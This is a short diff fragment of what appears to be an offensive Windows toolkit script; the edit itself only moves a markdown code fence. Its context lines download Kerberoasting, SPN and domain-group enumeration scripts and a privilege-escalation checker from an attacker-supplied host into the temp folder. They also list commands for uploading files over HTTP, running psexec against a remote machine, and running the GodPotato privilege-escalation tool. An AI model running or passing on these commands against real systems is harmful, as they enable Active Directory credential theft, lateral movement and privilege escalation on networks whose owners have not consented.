@@ -50,7 +50,7 @@ curl %arg1%/getAllDomainGroups.ps1 -o %temp%\getAllDomainGroups.ps1
 curl %arg1%/getListSPNS.ps1 -o %temp%\getListSPNS.ps1
 curl %arg1%/Invoke-Kerberoast.ps1 -o %temp%\Invoke-Kerberoast.ps1
 curl %arg1%/windows-privesc-check2.exe -o %temp%\windows-privesc-check2.exe
-```
+
 
 
 
@@ -63,7 +63,7 @@ echo upload: curl -X POST -F "file=@AnyDesk.exe" http://localhost:8080/upload
 echo psexec64.exe -accepteula \\ip cmd
 echo godpotato.exe -cmd "cmd /c whoami" 
 
-
+```
 
 
 
